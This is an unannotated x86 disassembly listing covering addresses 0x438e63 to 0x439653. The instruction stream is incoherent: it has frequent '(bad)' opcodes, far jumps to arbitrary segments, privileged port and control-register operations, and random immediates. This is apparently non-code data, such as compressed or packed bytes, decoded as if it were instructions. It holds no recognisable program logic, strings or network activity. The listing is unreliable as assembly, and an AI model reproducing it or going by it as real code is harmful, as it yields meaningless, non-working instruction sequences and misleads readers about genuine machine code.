  438e63:	stc    
  438e64:	sub    al,0x32
  438e66:	out    dx,al
  438e67:	jbe    0x438ec6
  438e69:	push   ebp
  438e6a:	aaa    
  438e6b:	xchg   ebp,eax
  438e6c:	idiv   BYTE PTR [esi-0x26]
  438e6f:	mov    dh,0x6e
  438e71:	adc    bh,BYTE PTR [eax-0x78]
  438e74:	jmp    0x438ee6
  438e76:	pop    ecx
  438e77:	adc    ch,BYTE PTR ds:0xec858d7
  438e7d:	shl    DWORD PTR [esi+0x570f0ef2],0x6f
  438e84:	ds cmp al,0x5a
  438e87:	aaa    
  438e88:	loopne 0x438ef6
  438e8a:	xor    bh,BYTE PTR [esi-0x5d7869bd]
  438e90:	std    
  438e91:	sub    BYTE PTR [edi+ebx*8-0x45be3f3b],cl
  438e98:	arpl   WORD PTR [ecx],ax
  438e9a:	imul   ecx,DWORD PTR [esi],0x33
  438e9d:	fld    QWORD PTR [edi]
  438e9f:	and    BYTE PTR [esi+0xe7],dl
  438ea5:	add    BYTE PTR [eax],al
  438ea7:	xchg   ah,bh
  438ea9:	adc    dh,BYTE PTR [eax+ebx*4+0x35]
  438ead:	adc    ebp,ecx
  438eaf:	xchg   ebx,eax
  438eb0:	mov    dl,0xf6
  438eb2:	jne    0x438e5b
  438eb4:	stos   DWORD PTR es:[edi],eax
  438eb5:	jmp    0xc49e:0x4c264c65
  438ebc:	pop    ss
  438ebd:	adc    edi,DWORD PTR [esi]
  438ebf:	fcom   st(5)
  438ec1:	xor    dh,BYTE PTR [esi]
  438ec3:	enter  0x32d5,0x2e
  438ec7:	enter  0x32d5,0xba
  438ecb:	inc    eax
  438ecc:	(bad)  
  438ecf:	shl    DWORD PTR [ecx-0x53e8ee6b],cl
  438ed5:	arpl   bx,bx
  438ed7:	jp     0x438ee7
  438ed9:	xor    ecx,ebp
  438edb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438edc:	clc    
  438edd:	je     0x438eca
  438edf:	mov    esp,0xb77de9fe
  438ee4:	loop   0x438f5a
  438ee6:	out    dx,al
  438ee7:	push   0xa6e6ea17
  438eec:	data16 add BYTE PTR [ecx],ch
  438eef:	mov    WORD PTR ds:0xaba65ccf,?
  438ef5:	add    al,0x79
  438ef7:	jge    0x438eeb
  438ef9:	push   cs
  438efa:	add    BYTE PTR [ecx-0x75],bh
  438efd:	out    0x15,eax
  438eff:	gs (bad) 
  438f01:	dec    esi
  438f02:	add    BYTE PTR [esi+0x6b5ffe23],ch
  438f08:	jne    0x438ef4
  438f0a:	mov    al,BYTE PTR [eax]
  438f0c:	add    BYTE PTR [eax],al
  438f0e:	add    BYTE PTR [eax],al
  438f10:	aas    
  438f11:	hlt    
  438f12:	enter  0xa402,0x73
  438f16:	push   cs
  438f17:	call   0x2b7761
  438f1c:	jbe    0x438ea7
  438f1e:	out    0x15,eax
  438f20:	add    edi,eax
  438f22:	dec    esi
  438f23:	add    BYTE PTR [edi-0x7f],dh
  438f26:	xchg   esp,eax
  438f27:	ret    
  438f28:	mov    ds:0x720002f8,al
  438f2d:	mov    bl,0x93
  438f2f:	inc    esi
  438f30:	in     eax,dx
  438f31:	mov    DWORD PTR [ecx+0xd22813c],edx
  438f37:	(bad)  
  438f38:	in     al,dx
  438f39:	hlt    
  438f3a:	sbb    DWORD PTR [eax-0x7],eax
  438f3d:	gs jmp 0x988b:0x4086b2ea
  438f45:	mov    dl,BYTE PTR [ebp-0x18764a82]
  438f4b:	adc    eax,0x4ec789
  438f50:	jbe    0x438fcd
  438f52:	adc    dl,BYTE PTR [edi-0x6a]
  438f55:	enter  0x12f6,0xf9
  438f59:	mov    ah,0x3b
  438f5b:	ror    dl,0xfd
  438f5e:	dec    esi
  438f5f:	cmp    DWORD PTR [edi-0x5874cc56],esi
  438f65:	mov    fs,edi
  438f67:	push   eax
  438f68:	bnd jns 0x438f79
  438f6b:	sub    esi,DWORD PTR [edx-0x4667ecd0]
  438f71:	mov    WORD PTR [edx],gs
  438f73:	pop    eax
  438f74:	add    BYTE PTR [eax],al
  438f76:	add    BYTE PTR [eax],al
  438f78:	add    BYTE PTR [edx-0x6fbde812],dh
  438f7e:	pop    edx
  438f7f:	ret    
  438f80:	clc    
  438f81:	jge    0x438f94
  438f83:	add    al,0x40
  438f85:	nop
  438f86:	push   ds
  438f87:	push   ebx
  438f88:	jae    0x438f38
  438f8a:	sbb    al,0x4e
  438f8c:	inc    eax
  438f8d:	mov    edx,0xa634d69a
  438f92:	jmp    0x438fdb
  438f94:	sub    eax,0xf8c1dd5b
  438f99:	popf   
  438f9a:	dec    ecx
  438f9b:	std    
  438f9c:	aas    
  438f9d:	nop
  438f9e:	dec    eax
  438f9f:	test   eax,0x840bf07
  438fa4:	call   0x5956692b
  438fa9:	mov    dh,0x23
  438fab:	dec    esi
  438fac:	push   ebp
  438fad:	rcr    BYTE PTR [ebp+0x34eb2e0e],cl
  438fb3:	outs   dx,BYTE PTR ds:[esi]
  438fb4:	jg     0x438fa2
  438fb6:	fldl2e 
  438fb8:	push   edi
  438fba:	ins    BYTE PTR es:[edi],dx
  438fbb:	(bad)  
  438fbc:	push   ecx
  438fbd:	inc    edi
  438fbe:	jae    0x438f9b
  438fc0:	test   dl,ah
  438fc2:	adc    al,0x7c
  438fc4:	mov    eax,DWORD PTR [esi+edi*4]
  438fc7:	xchg   BYTE PTR [eax],al
  438fc9:	nop
  438fca:	cdq    
  438fcb:	(bad)  
  438fcd:	bnd jns 0x439049
  438fd0:	stc    
  438fd1:	adc    eax,0x90903716
  438fd6:	cdq    
  438fd7:	push   cs
  438fd8:	stc    
  438fd9:	cld    
  438fda:	jne    0x43901e
  438fdc:	or     BYTE PTR [eax],al
  438fde:	add    BYTE PTR [eax],al
  438fe0:	add    BYTE PTR [eax],al
  438fe2:	nop
  438fe3:	cdq    
  438fe4:	gs leave 
  438fe6:	xor    ebx,DWORD PTR ds:[edi]
  438fe9:	push   eax
  438fea:	test   al,0xc0
  438fec:	retf   0x97f8
  438fef:	adc    eax,0x33dc7453
  438ff4:	adc    ecx,DWORD PTR [ebx-0x182d8a2c]
  438ffa:	sbb    dh,BYTE PTR [edx+0x6b796e7e]
  439000:	call   0xc0f6202b
  439005:	mov    bh,0xac
  439007:	xchg   al,dh
  439009:	add    edx,DWORD PTR [eax+0x78283c3d]
  43900f:	add    ecx,DWORD PTR [eax]
  439011:	fisubr DWORD PTR [esi-0x33b94ec5]
  439017:	(bad)  
  439018:	pop    es
  439019:	test   dl,dh
  43901b:	icebp  
  43901c:	neg    DWORD PTR [ebx+0x4f]
  43901f:	sbb    DWORD PTR [ecx+0xb72136e],ecx
  439025:	or     ch,bl
  439027:	mov    cl,0xef
  439029:	add    edx,DWORD PTR [eax+0x7c283ca8]
  43902f:	shl    dl,cl
  439031:	std    
  439032:	add    esi,esi
  439034:	fist   DWORD PTR [edi]
  439036:	pop    es
  439037:	and    edx,DWORD PTR [ecx]
  439039:	cmp    DWORD PTR [esi+edx*8+0xf],0x4
  43903e:	jl     0x439029
  439040:	add    eax,0xa3104944
  439045:	retf   0x0
  439048:	add    BYTE PTR [eax],al
  43904a:	add    BYTE PTR [esi+0x76],ah
  43904d:	cmp    bl,bh
  43904f:	fild   QWORD PTR [esi+0x8900736]
  439055:	jnp    0x438fde
  439057:	je     0x438fdf
  439059:	clc    
  43905a:	add    edx,DWORD PTR [eax+0x73d74b02]
  439060:	sub    ah,BYTE PTR [ebx-0x41]
  439063:	jae    0x43906f
  439065:	add    dl,ah
  439067:	fsubr  QWORD PTR [edi+0x24d22a01]
  43906d:	and    DWORD PTR [ecx+0x54],edi
  439070:	(bad)  
  439071:	cwde   
  439072:	daa    
  439073:	sbb    DWORD PTR [esi],esp
  439075:	hlt    
  439076:	das    
  439077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439078:	daa    
  439079:	mov    cr6,edi
  43907c:	(bad)  
  43907d:	bound  esp,QWORD PTR [esi+0x7443b3fa]
  439083:	adc    bh,dl
  439085:	ret    0x93e9
  439088:	mov    dl,0x3f
  43908a:	bound  esp,QWORD PTR [ebp-0x271ac055]
  439090:	mov    ds:0x6e6bbf94,al
  439095:	jmp    0x76e9:0x4ec083d4
  43909c:	fbstp  TBYTE PTR [ecx]
  43909e:	jmp    0x6cf6b236
  4390a3:	mov    esi,0xe89eaf26
  4390a8:	(bad)  
  4390a9:	ret    0x93e1
  4390ac:	mov    dl,0x9b
  4390ae:	and    eax,0x0
  4390b3:	add    BYTE PTR [eax-0x36],ch
  4390b6:	cmp    eax,0x95cd3a19
  4390bb:	scas   al,BYTE PTR es:[edi]
  4390bc:	ins    BYTE PTR es:[edi],dx
  4390bd:	loope  0x439136
  4390bf:	jbe    0x439136
  4390c1:	xor    edi,ecx
  4390c3:	ficom  WORD PTR [edi]
  4390c5:	sbb    ch,dl
  4390c7:	gs xchg di,ax
  4390ca:	(bad)  
  4390cb:	mov    eax,ds:0xe90eb2ac
  4390d0:	in     eax,dx
  4390d1:	in     al,0x52
  4390d3:	add    eax,0x47cec7e8
  4390d8:	dec    esp
  4390d9:	xchg   ebp,eax
  4390da:	jp     0x43911a
  4390dc:	cmp    eax,0x306244ab
  4390e1:	das    
  4390e2:	repz xor DWORD PTR [ecx],edi
  4390e5:	add    DWORD PTR [ebx],ebx
  4390e7:	push   0xe90fba30
  4390ec:	xchg   ebx,eax
  4390ed:	add    BYTE PTR [edx+0x16],al
  4390f0:	lahf   
  4390f1:	mov    ebp,0xf9191895
  4390f6:	push   ss
  4390f7:	add    BYTE PTR [ecx-0x71001b17],al
  4390fd:	xor    eax,0xe37675cf
  439102:	into   
  439103:	jmp    0x5247e2
  439108:	jmp    0xe7c7:0xc5000e9f
  43910f:	jne    0x43917a
  439111:	sub    dl,BYTE PTR [esi+0x8]
  439114:	dec    esi
  439115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439116:	push   ss
  439117:	push   0x0
  439119:	add    BYTE PTR [eax],al
  43911b:	add    BYTE PTR [eax],al
  43911d:	fs push ds
  43911f:	pop    ebp
  439120:	add    al,0x61
  439122:	rep outs dx,DWORD PTR ds:[esi]
  439124:	(bad)  
  439125:	(bad)  
  439126:	xor    al,0xcf
  439128:	je     0x439137
  43912a:	mov    ecx,DWORD PTR [eax-0x73]
  43912d:	jne    0x439109
  43912f:	sbb    bl,BYTE PTR [ecx+0x1]
  439132:	test   DWORD PTR [edi-0x1],eax
  439135:	dec    BYTE PTR [edx+0x1f5850eb]
  43913b:	pop    ebp
  43913c:	or     BYTE PTR [ebp+ebp*2-0x5871dfd2],bl
  439143:	push   cs
  439144:	call   0x29a5cd
  439149:	pop    esp
  43914a:	jne    0x43917a
  43914c:	or     BYTE PTR [eax+0x41202e75],al
  439152:	sub    edx,0xffffffff
  439155:	stc    
  439156:	sub    edi,esp
  439158:	test   DWORD PTR [esi-0x5b],ecx
  43915b:	add    BYTE PTR [edi+0x5c],dl
  43915e:	jne    0x43918e
  439160:	or     al,0x29
  439162:	sub    al,0x5b
  439164:	and    al,0xe1
  439166:	or     BYTE PTR [edi-0x6be1931a],dl
  43916c:	iret   
  43916d:	mov    eax,ds:0x8eff3c5f
  439172:	sub    bh,BYTE PTR [esi]
  439174:	or     BYTE PTR [eax+0xd07ac10],dl
  43917a:	push   edi
  43917b:	xor    dl,BYTE PTR [eax]
  43917d:	inc    eax
  43917e:	mov    ah,0xe0
  439180:	sldt   WORD PTR [eax]
  439183:	add    BYTE PTR [eax],al
  439185:	add    BYTE PTR [edi+0x42e7ea27],cl
  43918b:	aaa    
  43918c:	jnp    0x439187
  43918e:	or     esp,esi
  439190:	xor    DWORD PTR [eax],ecx
  439192:	xchg   ecx,eax
  439193:	cdq    
  439194:	push   cs
  439195:	mov    ebx,esp
  439197:	mov    ch,0x2
  439199:	call   0xf9bc0d55
  43919e:	mov    ds:0x7bc23a59,eax
  4391a3:	pop    ecx
  4391a4:	pop    esi
  4391a5:	fsubr  st,st(7)
  4391a7:	retf   
  4391a8:	imul   esp,ebx,0xffe757e5
  4391ae:	in     al,0x10
  4391b0:	inc    edi
  4391b1:	jg     0x4391d7
  4391b3:	xchg   esi,eax
  4391b4:	adc    al,0x0
  4391b6:	nop
  4391b7:	call   0x1758e278
  4391bc:	sub    edi,ebx
  4391be:	pop    ds
  4391bf:	cmp    eax,0x344b644b
  4391c4:	jbe    0x4391f3
  4391c6:	rcr    BYTE PTR [esi],1
  4391c8:	test   al,0xb7
  4391ca:	sbb    esp,DWORD PTR [edx]
  4391cc:	push   0xffffffd8
  4391ce:	or     edi,edx
  4391d0:	pop    esi
  4391d1:	xchg   DWORD PTR [ebp+0x11],ecx
  4391d4:	ins    BYTE PTR es:[edi],dx
  4391d5:	inc    ebx
  4391d6:	in     al,dx
  4391d7:	add    DWORD PTR [eax-0x12fb18c1],ecx
  4391dd:	ss cmp eax,0x52fdf41
  4391e3:	pop    edi
  4391e4:	mov    dh,0x50
  4391e6:	sbb    eax,0xe87a5f
  4391eb:	add    BYTE PTR [eax],al
  4391ed:	add    BYTE PTR [eax],al
  4391ef:	cmc    
  4391f0:	adc    eax,0xda14f975
  4391f5:	ficomp WORD PTR [edi]
  4391f7:	or     esi,DWORD PTR [ebx-0x1ea9856]
  4391fd:	add    ebx,DWORD PTR [ebp+esi*8+0x4]
  439201:	add    DWORD PTR [ebx+0x15],ebp
  439204:	inc    BYTE PTR [ebx]
  439206:	jg     0x4391a0
  439208:	call   0x43a5:0xab8936c1
  43920f:	pmaddwd mm5,mm3
  439212:	jl     0x4391e7
  439214:	stos   BYTE PTR es:[edi],al
  439215:	outs   dx,DWORD PTR ds:[esi]
  439216:	sar    DWORD PTR [ebx+0x3d],0x7b
  43921a:	aaa    
  43921b:	imul   ebp,DWORD PTR [ebx-0x2e52c37],0xffffffcb
  439222:	pop    ebx
  439223:	out    0x3e,al
  439225:	fisubr DWORD PTR [edx+0xd]
  439228:	std    
  439229:	stos   DWORD PTR es:[edi],eax
  43922a:	jg     0x43927c
  43922c:	es retf 
  43922e:	jle    0x439213
  439230:	scas   al,BYTE PTR es:[edi]
  439231:	rol    BYTE PTR [ebx+0x7eb9abe2],1
  439237:	retf   
  439238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439239:	pop    ebp
  43923a:	dec    ebx
  43923b:	cmp    BYTE PTR [esi-0x20d6953a],ch
  439241:	scas   al,BYTE PTR es:[edi]
  439242:	and    al,0xcb
  439244:	stos   BYTE PTR es:[edi],al
  439245:	xlat   BYTE PTR ds:[ebx]
  439246:	mov    eax,0x7023391b
  43924b:	clc    
  43924c:	popf   
  43924d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43924e:	push   0x9
  439250:	cmp    eax,0x600b
  439255:	add    BYTE PTR [eax],al
  439257:	add    BYTE PTR [esi+0xb],dh
  43925a:	call   FWORD PTR [ebx-0x43]
  43925d:	or     al,0x71
  43925f:	push   0x27
  439261:	mov    ?,WORD PTR [edx+0x3737e7c3]
  439267:	add    ch,0xba
  43926a:	mov    dl,0x46
  43926c:	inc    eax
  43926d:	xor    eax,0x7b52fa51
  439272:	xchg   DWORD PTR [edx+0x3],ebp
  439275:	test   BYTE PTR [esi],0x37
  439278:	sub    ch,BYTE PTR [ecx+0x257a49c]
  43927e:	pushf  
  43927f:	lods   al,BYTE PTR ds:[esi]
  439280:	and    edx,DWORD PTR [edi+ecx*1]
  439283:	mov    ecx,0x16ed9c4b
  439288:	sub    ch,BYTE PTR ds:0x7916f1d3
  43928e:	xchg   esi,eax
  43928f:	stc    
  439290:	jmp    0xd62f:0xf9fe1d5d
  439297:	add    DWORD PTR [ecx],esi
  439299:	fldl2t 
  43929b:	out    dx,al
  43929c:	mov    ebp,0x69df9472
  4392a1:	not    BYTE PTR [ebx-0x27]
  4392a4:	ss popf 
  4392a6:	adc    cl,ch
  4392a8:	xchg   ebx,eax
  4392a9:	cmp    eax,0xabefa19c
  4392ae:	jmp    0x3733:0x4fb293af
  4392b5:	mov    eax,ds:0x714d174a
  4392ba:	into   
  4392bb:	adc    al,0x0
  4392bd:	add    BYTE PTR [eax],al
  4392bf:	add    BYTE PTR [eax],al
  4392c1:	mov    ch,0x96
  4392c3:	sbb    bl,BYTE PTR [edi-0x6d]
  4392c6:	add    edx,DWORD PTR [esi+0x48a846a3]
  4392cc:	shr    BYTE PTR [ebp+0xcd9640b],cl
  4392d2:	stos   DWORD PTR es:[edi],eax
  4392d3:	adc    eax,0xe72796fd
  4392d8:	in     al,dx
  4392d9:	mul    BYTE PTR [eax]
  4392db:	xchg   esi,eax
  4392dc:	sub    al,0xfc
  4392de:	icebp  
  4392df:	and    eax,0x8eb3fda1
  4392e4:	loopne 0x439278
  4392e6:	mov    al,0x62
  4392e8:	jmp    0xbe27:0x624d789c
  4392ef:	xchg   edi,eax
  4392f0:	clc    
  4392f1:	xor    al,0xb1
  4392f3:	xchg   ebp,eax
  4392f4:	add    ah,bh
  4392f6:	mov    eax,ds:0xb5b800cf
  4392fb:	push   cs
  4392fc:	add    BYTE PTR [edx+0x1ceb4ef5],bh
  439302:	das    
  439303:	out    0xa,eax
  439305:	cmc    
  439306:	imul   ebp,DWORD PTR [ebx-0x8],0xffffffb5
  43930a:	fwait
  43930b:	repnz add DWORD PTR [ecx-0x3bd3a15f],0x28
  439313:	(bad)  
  439315:	jns    0x4392b0
  439317:	std    
  439318:	add    al,0xb1
  43931a:	sti    
  43931b:	out    0xff,eax
  43931d:	jmp    0x4e26:0x3a76ea16
  439324:	or     al,0x0
  439326:	add    BYTE PTR [eax],al
  439328:	add    BYTE PTR [eax],al
  43932a:	ds mov ch,0xeb
  43932d:	(bad)  
  43932e:	jns    0x4392e5
  439330:	repz shl dl,1
  439333:	push   0xdc303316
  439338:	push   ebp
  439339:	adc    BYTE PTR [esi+0x38],al
  43933c:	stos   BYTE PTR es:[edi],al
  43933d:	inc    ecx
  43933e:	shr    BYTE PTR [ebp+0x68b2c0f3],0x12
  439345:	dec    eax
  439346:	inc    edx
  439347:	in     eax,dx
  439348:	jnp    0x439350
  43934a:	mov    ecx,0x7d09e99c
  43934f:	scas   eax,DWORD PTR es:[edi]
  439350:	cmp    edx,edx
  439352:	imul   esp,DWORD PTR [edi],0x4e
  439355:	or     al,0xb0
  439357:	(bad)
  43935a:	dec    edx
  43935b:	cmc    
  43935c:	inc    ebp
  43935d:	ret    0xb4f5
  439360:	cmp    eax,0x7483158b
  439365:	add    dh,BYTE PTR [eax-0x749e884]
  43936b:	aad    0xbc
  43936d:	jne    0x4392ff
  43936f:	das    
  439370:	out    0xa,eax
  439372:	nop
  439373:	xchg   DWORD PTR [edi-0x57a2784],edi
  439379:	add    eax,DWORD PTR [ebx+0x1b644adb]
  43937f:	push   esi
  439380:	loop   0x439342
  439382:	xchg   ecx,eax
  439383:	call   0x7cbf:0xf490000e
  43938a:	test   al,0xa4
  43938c:	cli    
  43938d:	cmp    DWORD PTR [eax],eax
  43938f:	add    BYTE PTR [eax],al
  439391:	add    BYTE PTR [eax],al
  439393:	lds    edx,FWORD PTR es:[edx+0x2418df8]
  43939a:	cmp    ecx,DWORD PTR ds:0x4000e9b
  4393a0:	xchg   ecx,ebp
  4393a2:	xlat   BYTE PTR ds:[ebx]
  4393a3:	addr16 test eax,0x9b787d72
  4393a9:	(bad)  
  4393ab:	or     ecx,DWORD PTR [edi-0x1e]
  4393ae:	rcl    BYTE PTR [eax-0x6ffff164],0x84
  4393b5:	add    DWORD PTR [ebp-0x38e2722b],eax
  4393bb:	cdq    
  4393bc:	mov    BYTE PTR [edx],0x9
  4393bf:	and    eax,0x9886d45b
  4393c4:	test   BYTE PTR [ecx],dl
  4393c6:	test   ebp,edx
  4393c8:	lea    ebp,[ecx]
  4393ca:	add    BYTE PTR [ecx+0x3b000e99],dl
  4393d0:	lods   eax,DWORD PTR ds:[esi]
  4393d1:	xor    eax,0xe8bf984b
  4393d6:	jg     0x439371
  4393d8:	inc    eax
  4393d9:	call   0x7cd02751
  4393de:	inc    edx
  4393df:	sbb    edx,edi
  4393e1:	out    0x86,al
  4393e3:	shr    BYTE PTR [esi+ecx*2+0x40],0x5e
  4393e8:	mov    esi,0xbf900c4c
  4393ed:	gs out dx,eax
  4393ef:	clc    
  4393f0:	mov    dl,0xeb
  4393f2:	add    edx,DWORD PTR [eax+0xc041b2]
  4393f8:	add    BYTE PTR [eax],al
  4393fa:	add    BYTE PTR [eax],al
  4393fc:	mov    bl,0xba
  4393fe:	imul   bh
  439400:	nop
  439401:	cmp    ecx,DWORD PTR [edx]
  439403:	pop    esp
  439404:	pop    edi
  439405:	loope  0x439457
  439407:	addr16 or eax,0x94418a71
  43940d:	mov    dl,0x89
  43940f:	jp     0x4393b8
  439411:	cmp    ecx,DWORD PTR [edx+0x3fb0d0fb]
  439417:	sahf   
  439418:	push   eax
  439419:	mov    dl,0x72
  43941b:	cmp    eax,0x56cbc24
  439420:	inc    edi
  439421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439422:	test   al,0xfb
  439424:	or     al,0x11
  439426:	loopne 0x43942b
  439428:	or     eax,0x425c8a78
  43942d:	mov    fs,ebx
  43942f:	data16 jecxz 0x43946d
  439432:	in     al,dx
  439433:	aam    0xde
  439435:	call   FWORD PTR [esp+ebp*2-0x1b]
  439439:	daa    
  43943a:	loopne 0x43943f
  43943c:	in     al,0xae
  43943e:	xchg   DWORD PTR [ebp*2+0x4be0751a],eax
  439445:	mov    dl,0x9
  439447:	stos   BYTE PTR es:[edi],al
  439448:	mov    al,0xbf
  43944a:	aaa    
  43944b:	add    al,0x7
  43944d:	xor    cl,cl
  43944f:	ret    
  439450:	aaa    
  439451:	(bad)  
  439452:	scas   al,BYTE PTR es:[edi]
  439453:	pop    edi
  439454:	sub    esp,DWORD PTR [edi-0x5fec8ca3]
  43945a:	add    al,0x27
  43945c:	adc    eax,0xe074b8
  439461:	add    BYTE PTR [eax],al
  439463:	add    BYTE PTR [eax],al
  439465:	pop    ds
  439466:	mov    dl,0x4a
  439468:	rol    BYTE PTR [edi],0x2
  43946b:	or     ah,BYTE PTR [edi+0x57]
  43946e:	(bad)  
  43946f:	jb     0x4394b4
  439471:	or     edi,0xe
  439474:	bound  edi,QWORD PTR [eax]
  439476:	lahf   
  439477:	xchg   esp,eax
  439478:	mov    al,ds:0xe895c6ff
  43947d:	push   0xc4bbeb03
  439482:	test   eax,0xfb5af53f
  439487:	jmp    0xd072:0xcf33621a
  43948e:	sahf   
  43948f:	sbb    ah,BYTE PTR [ecx+edi*2+0x3a355c2f]
  439496:	mov    edx,0xaec42e3e
  43949b:	xchg   ebp,eax
  43949c:	out    dx,eax
  43949d:	aad    0xa9
  43949f:	aas    
  4394a0:	icebp  
  4394a1:	sbb    dh,bl
  4394a3:	jmp    0xce4:0x637210b7
  4394aa:	hlt    
  4394ab:	push   ss
  4394ac:	adc    dl,BYTE PTR ds:0xbc9eced5
  4394b2:	addr16 inc esp
  4394b4:	(bad)  
  4394b5:	fcomip st,st(5)
  4394b7:	xchg   ebp,eax
  4394b8:	test   al,0x6b
  4394ba:	daa    
  4394bb:	je     0x4394a2
  4394bd:	mov    WORD PTR [edi],gs
  4394bf:	pop    ss
  4394c0:	ins    BYTE PTR es:[edi],dx
  4394c1:	dec    edi
  4394c2:	stos   BYTE PTR es:[edi],al
  4394c3:	cmp    eax,0x56f5ed39
  4394c8:	bound  eax,QWORD PTR [eax]
  4394ca:	add    BYTE PTR [eax],al
  4394cc:	add    BYTE PTR [eax],al
  4394ce:	pop    es
  4394cf:	stos   BYTE PTR es:[edi],al
  4394d0:	push   ds
  4394d1:	fwait
  4394d2:	(bad)  
  4394d3:	jb     0x4394ef
  4394d5:	and    al,0x7a
  4394d7:	das    
  4394d8:	shl    BYTE PTR [eax+0x19a500d1],1
  4394de:	popf   
  4394df:	repnz push cs
  4394e1:	pusha  
  4394e2:	sbb    al,0xc3
  4394e4:	dec    esi
  4394e5:	jmp    0x953687a5
  4394ea:	lods   eax,DWORD PTR ds:[esi]
  4394eb:	das    
  4394ec:	fbld   TBYTE PTR [esi+edi*2+0x1e]
  4394f0:	inc    edi
  4394f1:	add    BYTE PTR [esi-0x12db9cf1],ah
  4394f7:	push   cs
  4394f8:	dec    BYTE PTR [ebx-0x26]
  4394fb:	jno    0x4394e7
  4394fd:	mov    ah,BYTE PTR [ecx+0x25]
  439500:	call   0x156f1979
  439505:	push   edi
  439506:	daa    
  439507:	cvtps2pd xmm4,QWORD PTR [eax]
  43950a:	fs out dx,al
  43950c:	pop    ebp
  43950d:	sub    ch,dh
  43950f:	push   esi
  439510:	push   ebx
  439511:	and    al,0xe9
  439513:	sub    dl,BYTE PTR ds:0x5a0f2750
  439519:	cmp    BYTE PTR [esi+ebp*8],ah
  43951c:	pop    ebp
  43951d:	sbb    bh,BYTE PTR [esi-0x5e]
  439520:	cs adc al,0x22
  439523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439524:	inc    eax
  439525:	(bad)  
  439526:	fabs   
  439528:	(bad)  
  439529:	shl    ah,0x9d
  43952c:	xchg   ebx,eax
  43952d:	push   es
  43952e:	adc    esi,DWORD PTR [ecx+0xff3c]
  439534:	add    BYTE PTR [eax],al
  439536:	add    BYTE PTR [ecx],ch
  439538:	jno    0x4394c7
  43953a:	rol    BYTE PTR ds:0x170693aa,0xe
  439541:	aas    
  439542:	or     BYTE PTR [edx],ch
  439544:	pop    ss
  439545:	inc    eax
  439546:	jmp    DWORD PTR [ebp+esi*2+0x1b]
  43954a:	inc    eax
  43954b:	imul   ebp,DWORD PTR [edx],0xf09f5fcd
  439551:	(bad)  
  439552:	dec    DWORD PTR [eax-0x58aaa47f]
  439558:	ja     0x4394ed
  43955a:	jmp    0x2b04c0
  43955f:	(bad)  
  439560:	sub    DWORD PTR [ebx+0x24],ecx
  439563:	cdq    
  439564:	sub    ebx,edi
  439566:	xor    edi,ecx
  439568:	daa    
  439569:	push   ebx
  43956a:	and    al,0x25
  43956c:	and    al,0xdd
  43956e:	je     0x439500
  439570:	into   
  439571:	gs inc esp
  439573:	mov    ah,0xab
  439575:	or     dl,BYTE PTR [di]
  439578:	xlat   BYTE PTR ds:[ebx]
  439579:	adc    BYTE PTR cs:[eax+0x24],ah
  43957d:	cli    
  43957e:	and    ebp,DWORD PTR [eax+0x40bdbb8c]
  439584:	mov    ebp,0x20b84f73
  439589:	mov    ds:0x3cc88023,al
  43958e:	adc    eax,0xffffff8b
  439591:	test   eax,0xa4719c5
  439596:	adc    BYTE PTR [ebx],bl
  439598:	xchg   ebp,eax
  439599:	fdiv   st(0),st
  43959b:	add    BYTE PTR [eax],al
  43959d:	add    BYTE PTR [eax],al
  43959f:	add    BYTE PTR [eax-0x5d],ah
  4395a2:	addr16 jl 0x439611
  4395a5:	mov    ebp,DWORD PTR [ecx-0x7]
  4395a8:	and    al,0x82
  4395aa:	add    DWORD PTR [bp+si],edi
  4395ad:	int3   
  4395ae:	(bad)  
  4395b0:	inc    eax
  4395b1:	imul   esp,DWORD PTR [edi+0x9],0x3f
  4395b5:	adc    BYTE PTR [esi-0x7],bl
  4395b8:	loope  0x43954b
  4395ba:	pop    ds
  4395bb:	ror    BYTE PTR ds:0x5093dea4,0xc1
  4395c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4395c3:	dec    esi
  4395c4:	ja     0x4395ec
  4395c6:	or     ch,BYTE PTR [eax]
  4395c8:	ret    
  4395c9:	xchg   esp,eax
  4395ca:	stc    
  4395cb:	and    edi,DWORD PTR [eax+0x5ff8e881]
  4395d1:	test   DWORD PTR [edx-0x379ef228],ebx
  4395d7:	add    eax,DWORD PTR [edx+0x1b297a59]
  4395dd:	pop    edi
  4395de:	jnp    0x4395bf
  4395e0:	ds outs dx,BYTE PTR gs:[esi]
  4395e3:	test   DWORD PTR [eax],edi
  4395e5:	pop    ss
  4395e6:	outs   dx,BYTE PTR ds:[esi]
  4395e7:	je     0x439571
  4395e9:	adc    BYTE PTR [esi],dl
  4395eb:	dec    ebp
  4395ec:	mov    edi,0x7fb4b0b2
  4395f1:	aaa    
  4395f2:	stc    
  4395f3:	mov    edx,0xb581a30c
  4395f8:	xchg   edi,eax
  4395f9:	sub    eax,0x731c1382
  4395fe:	pusha  
  4395ff:	enter  0xbeb3,0x5c
  439603:	sldt   WORD PTR [eax]
  439606:	add    BYTE PTR [eax],al
  439608:	add    BYTE PTR [ebp-0x5d],al
  43960b:	pop    es
  43960c:	or     al,0x16
  43960e:	out    dx,eax
  43960f:	shl    edi,cl
  439611:	dec    eax
  439612:	add    al,0xd3
  439614:	mov    esi,0xf4360946
  439619:	xlat   BYTE PTR ds:[ebx]
  43961a:	(bad)  
  43961b:	ins    BYTE PTR es:[edi],dx
  43961c:	jo     0x43966d
  43961e:	xchg   esi,eax
  43961f:	xchg   esp,eax
  439620:	push   es
  439621:	nop
  439622:	mov    dl,0x5c
  439624:	inc    esi
  439625:	bound  esi,QWORD PTR [edi]
  439627:	daa    
  439628:	mov    ebx,0xc9ac9d12
  43962d:	jl     0x4395d2
  43962f:	rcr    BYTE PTR [edx+ebp*2],cl
  439632:	push   ds
  439633:	icebp  
  439634:	nop
  439635:	add    edx,DWORD PTR [ebx]
  439637:	or     esp,DWORD PTR [ebx-0x67]
  43963a:	aaa    
  43963b:	xor    BYTE PTR [ecx+eiz*2+0x8],ch
  43963f:	sbb    DWORD PTR [ebx+0x1b],esp
  439642:	cmc    
  439643:	jmp    0x4395fe
  439645:	push   ss
  439646:	and    eax,0xa6fb8ce4
  43964b:	adc    BYTE PTR [edi-0x78065be8],cl
  439651:	push   eax
  439652:	push   ds
  439653:	jmp    0x7bea79ba
